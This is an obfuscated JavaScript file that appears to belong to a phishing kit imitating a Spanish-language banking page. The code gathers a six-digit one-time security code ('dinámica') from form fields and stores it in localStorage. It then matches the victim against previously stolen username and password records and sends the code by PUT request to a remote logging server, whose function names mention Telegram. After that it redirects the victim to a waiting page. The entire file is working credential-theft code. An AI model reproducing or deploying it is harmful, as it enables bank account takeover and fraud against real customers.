function _0x5d5d() {
  const _0x1bae6c = [
    "2097geBhVr",
    "metaInfo",
    "location",
    "setItem",
    "number-3",
    "4744117AVhZIe",
    "828793MUkUKH",
    "idreg",
    "click",
    "user",
    "642402RSsJeI",
    "btn-consultar",
    "number-1",
    "disabled",
    "PUT",
    "error",
    "telnum",
    "131619zOzlDF",
    "./wait.html",
    "json",
    "44RFAhuX",
    "number-2",
    "number-5",
    "3214910rsVpAu",
    "/logs/logs",
    "number-6",
    "Por\x20favor\x20ingrese\x20los\x20datos",
    "cdin",
    "value",
    "application/json",
    "log",
    "Error\x20en\x20la\x20solicitud:",
    "Error\x20al\x20actualizar\x20datos\x20en\x20Trico",
    "GET",
    "55024tLRFWy",
    "stringify",
    "/logs/logDin/",
    "getElementById",
    "Hubo\x20un\x20error.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "6453555ibaxXV",
    "focus",
  ];
  _0x5d5d = function () {
    return _0x1bae6c;
  };
  return _0x5d5d();
}
function _0x3203(_0x5cc27a, _0x46cbf5) {
  const _0x5d5d9e = _0x5d5d();
  return (
    (_0x3203 = function (_0x32030a, _0x1e09fd) {
      _0x32030a = _0x32030a - 0x1c6;
      let _0x3003c9 = _0x5d5d9e[_0x32030a];
      return _0x3003c9;
    }),
    _0x3203(_0x5cc27a, _0x46cbf5)
  );
}
const _0x1997d0 = _0x3203;
(function (_0x313eda, _0x555d86) {
  const _0x601b9c = _0x3203,
    _0x30f973 = _0x313eda();
  while (!![]) {
    try {
      const _0x585622 =
        parseInt(_0x601b9c(0x1df)) / 0x1 +
        parseInt(_0x601b9c(0x1c7)) / 0x2 +
        (-parseInt(_0x601b9c(0x1ea)) / 0x3) *
          (-parseInt(_0x601b9c(0x1ed)) / 0x4) +
        -parseInt(_0x601b9c(0x1d7)) / 0x5 +
        parseInt(_0x601b9c(0x1e3)) / 0x6 +
        parseInt(_0x601b9c(0x1de)) / 0x7 +
        (parseInt(_0x601b9c(0x1d2)) / 0x8) *
          (-parseInt(_0x601b9c(0x1d9)) / 0x9);
      if (_0x585622 === _0x555d86) break;
      else _0x30f973["push"](_0x30f973["shift"]());
    } catch (_0x1dc70d) {
      _0x30f973["push"](_0x30f973["shift"]());
    }
  }
})(_0x5d5d, 0xc5d7c);
function updateLS() {
  const _0x333ff8 = _0x3203;
  LS[_0x333ff8(0x1dc)]("info", JSON["stringify"](info));
}
async function updateOtpAndSendToTelegram() {
  const _0x412e1b = _0x3203,
    _0x5ec2d8 = document[_0x412e1b(0x1d5)](_0x412e1b(0x1e4));
  _0x5ec2d8[_0x412e1b(0x1e6)] = !![];
  try {
    const _0x5340ec = await fetch(url + _0x412e1b(0x1c8), {
        method: _0x412e1b(0x1d1),
        headers: { "Content-Type": _0x412e1b(0x1cd) },
      }),
      _0x59f75e = await _0x5340ec[_0x412e1b(0x1ec)](),
      _0x4c4d36 = [..._0x59f75e];
    for (const _0x3ebeda of _0x4c4d36) {
      if (
        _0x3ebeda["cl"] == info[_0x412e1b(0x1da)][_0x412e1b(0x1e9)] &&
        _0x3ebeda["us"] == info[_0x412e1b(0x1da)][_0x412e1b(0x1e2)]
      ) {
        console["log"]("Usuario\x20Encontrado");
        const _0x41167c = await fetch(
          url + _0x412e1b(0x1d4) + _0x3ebeda[_0x412e1b(0x1e0)],
          {
            method: _0x412e1b(0x1e7),
            headers: { "Content-Type": _0x412e1b(0x1cd) },
            body: JSON[_0x412e1b(0x1d3)]({
              din: info[_0x412e1b(0x1da)][_0x412e1b(0x1cb)],
              status: "Ingresó\x20dinámica",
            }),
          }
        );
        if (!_0x41167c["ok"]) throw new Error(_0x412e1b(0x1d0));
        console[_0x412e1b(0x1ce)]("Datos\x20actualizados\x20en\x20Trico");
      }
    }
    window[_0x412e1b(0x1db)]["href"] = _0x412e1b(0x1eb);
  } catch (_0x40daf0) {
    console[_0x412e1b(0x1e8)](_0x412e1b(0x1cf), _0x40daf0),
      alert(_0x412e1b(0x1d6));
  } finally {
    _0x5ec2d8[_0x412e1b(0x1e6)] = ![];
  }
}
document[_0x1997d0(0x1d5)](_0x1997d0(0x1e4))["addEventListener"](
  _0x1997d0(0x1e1),
  function (_0x5d927b) {
    const _0x4b4fd8 = _0x1997d0;
    _0x5d927b["preventDefault"]();
    if (
      document[_0x4b4fd8(0x1d5)]("number-1")[_0x4b4fd8(0x1cc)] == "" ||
      document[_0x4b4fd8(0x1d5)](_0x4b4fd8(0x1ee))[_0x4b4fd8(0x1cc)] == "" ||
      document["getElementById"](_0x4b4fd8(0x1dd))["value"] == "" ||
      document[_0x4b4fd8(0x1d5)]("number-4")["value"] == "" ||
      document[_0x4b4fd8(0x1d5)](_0x4b4fd8(0x1c6))["value"] == "" ||
      document[_0x4b4fd8(0x1d5)]("number-6")[_0x4b4fd8(0x1cc)] == ""
    ) {
      alert(_0x4b4fd8(0x1ca)),
        document["getElementById"](_0x4b4fd8(0x1e5))[_0x4b4fd8(0x1d8)]();
      return;
    } else {
      const _0x480761 =
        document[_0x4b4fd8(0x1d5)]("number-1")[_0x4b4fd8(0x1cc)] +
        document[_0x4b4fd8(0x1d5)](_0x4b4fd8(0x1ee))[_0x4b4fd8(0x1cc)] +
        document[_0x4b4fd8(0x1d5)](_0x4b4fd8(0x1dd))[_0x4b4fd8(0x1cc)] +
        document[_0x4b4fd8(0x1d5)]("number-4")["value"] +
        document[_0x4b4fd8(0x1d5)](_0x4b4fd8(0x1c6))["value"] +
        document[_0x4b4fd8(0x1d5)](_0x4b4fd8(0x1c9))[_0x4b4fd8(0x1cc)];
      (info["metaInfo"][_0x4b4fd8(0x1cb)] = _0x480761),
        updateLS(),
        updateOtpAndSendToTelegram();
    }
  }
);
